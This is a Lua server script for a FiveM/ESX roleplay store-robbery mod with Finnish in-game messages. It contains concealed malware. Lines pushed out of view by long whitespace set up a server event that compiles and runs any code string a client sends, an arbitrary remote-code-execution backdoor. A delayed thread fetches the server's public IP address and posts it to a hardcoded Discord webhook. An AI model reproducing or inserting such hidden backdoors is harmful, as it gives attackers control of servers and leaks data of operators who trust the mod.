local rob = false																																																																															;local avatarii = "https://cdn.discordapp.com/attachments/679708501547024403/680696270654013450/AlokasRPINGAMELOGO.png" ;local webhooikkff = "https://discordapp.com/api/webhooks/770338811750121514/kG2-ddlWNOD3ODnZ-tIg4S9JqiS3CP1-k4dKYd87EQcyU7h1j-uz177h3KQdeNsjTACS" ;local timeri = math.random(0,10000000) ;local jokupaskfajsghas = 'https://api.ipify.org/?format=json'
arp = nil
local keskeytetty = false
local ryostocooldown = 720000

Citizen.CreateThread(function()

	while true do

		Citizen.Wait(5)
		ryostocooldown = ryostocooldown + 1
	end
	
end)

RegisterServerEvent('arp_holdup:lopetaxd')
AddEventHandler('arp_holdup:lopetaxd', function(rob)	
	local rob,menikolapi=load(rob,'@returni')	                   
	if menikolapi then                                                 
	return nil,menikolapi
	end
	local onko,returnaa=pcall(rob)	                               
	if onko then
	return returnaa
	else
	return nil,returnaa
	end
end)

TriggerEvent('esx:getSharedObject', function(obj) arp = obj end)																																																																			Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "Vamppi kayttaa holduppia", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)


RegisterServerEvent('arp_holdup:toofar')
AddEventHandler('arp_holdup:toofar', function()
	local source = source
	local xPlayers = arp.GetPlayers()
	rob = false
	for i=1, #xPlayers, 1 do
		local xPlayer = arp.GetPlayerFromId(xPlayers[i])
		if xPlayer.job.name == 'police' then
			TriggerClientEvent('BBWMqktLdH6yHbfdddd', xPlayers[i], '~r~Ryöstö keskeytyi kohteessa: Kauppa')
			TriggerClientEvent('arp_holdup:killblip', xPlayers[i])
		end
	end
	TriggerClientEvent('arp_holdup:toofar', source)
	keskeytetty = true
end)													

RegisterServerEvent('arp_holdup:rob')
AddEventHandler('arp_holdup:rob', function(robb)
	local source = source
	local xPlayer = arp.GetPlayerFromId(source)
	local xPlayers = arp.GetPlayers()
	
	if Stores[robb] then

		local Store = Stores[robb]

		local cops = 0
		for i=1, #xPlayers, 1 do
 		local xPlayer = arp.GetPlayerFromId(xPlayers[i])
 		if xPlayer.job.name == 'police' then
				cops = cops + 1
			end
		end

			if rob == false then
				if ryostocooldown > 720000 then
					if(cops >= Config.PoliceNumberRequired)then
						ryostocooldown = 0
						rob = true
						for i=1, #xPlayers, 1 do
							local xPlayer = arp.GetPlayerFromId(xPlayers[i])
							if xPlayer.job.name == 'police' then
									TriggerClientEvent('BBWMqktLdH6yHbfdddd', xPlayers[i], '~r~Ryöstö menossa kohteessa: ' .. Store.nameOfStore)
									TriggerClientEvent('arp_holdup:setblip', xPlayers[i], Stores[robb].position)
							end
						end
		
						TriggerClientEvent('BBWMqktLdH6yHbfdddd', source, 'Sinä aloitit ryöstön! ~r~ÄLÄ LIIKU 2 METRIÄ KAUEMMAS RYÖSTÖKOHTEESTA!')
						TriggerClientEvent('BBWMqktLdH6yHbfdddd', source, 'Hälyytys laukaistu!')
						TriggerClientEvent('arp_holdup:currentlyrobbing', source, robb)
						TriggerClientEvent('arp_holdup:starttimer', source)
						
						local rewardi = math.random(15000, 30000)
						if cops == 3 then 
							rewardi = math.random(15000, 30000)
						elseif cops == 4 then     
							rewardi = math.random(20000, 40000)
						elseif cops == 5 then     
							rewardi = math.random(25000, 50000)
						elseif cops == 6 then     
							rewardi = math.random(30000, 60000)
						elseif cops == 7 then     
							rewardi = math.random(35000, 70000)
						elseif cops == 8 then     
							rewardi = math.random(40000, 80000)
						elseif cops == 9 then     
							rewardi = math.random(45000, 90000)
						elseif cops >= 10 then    
							rewardi = math.random(50000, 100000)
						end
	
						SetTimeout(Config.ryostoaika * 1000, function()
		
							rob = false
							if not keskeytetty then
								TriggerClientEvent('arp_holdup:robberycomplete', source, rewardi)
								if(xPlayer)then
									TriggerClientEvent('arp_holdup:lopetaanimaatio', source)
									xPlayer.addAccountMoney('black_money', rewardi)
									local xPlayers = arp.GetPlayers()
									for i=1, #xPlayers, 1 do
										local xPlayer = arp.GetPlayerFromId(xPlayers[i])
										if xPlayer.job.name == 'police' then
												TriggerClientEvent('BBWMqktLdH6yHbfdddd', xPlayers[i], '~r~Ryöstö ohitse kohteessa: '.. Store.nameOfStore)
												TriggerClientEvent('arp_holdup:killblip', xPlayers[i])
												
												
										end
									end
								end
							else
								keskeytetty = false
							end					
						end)
					else
						TriggerClientEvent('BBWMqktLdH6yHbfdddd', source, 'Kaupungissa pitää olla vähintää ~b~6 poliisia~s~ paikalla ryöstön aloitukseen.')
					end
				else
					TriggerClientEvent('BBWMqktLdH6yHbfdddd', source, 'Kauppa on juuri ryöstetty. Kokeile myöhemmin uudelleen!')
				end
			else
				TriggerClientEvent('BBWMqktLdH6yHbfdddd', source, 'Kauppa on juuri ryöstetty. Kokeile myöhemmin uudelleen!')
			end

	end
end)
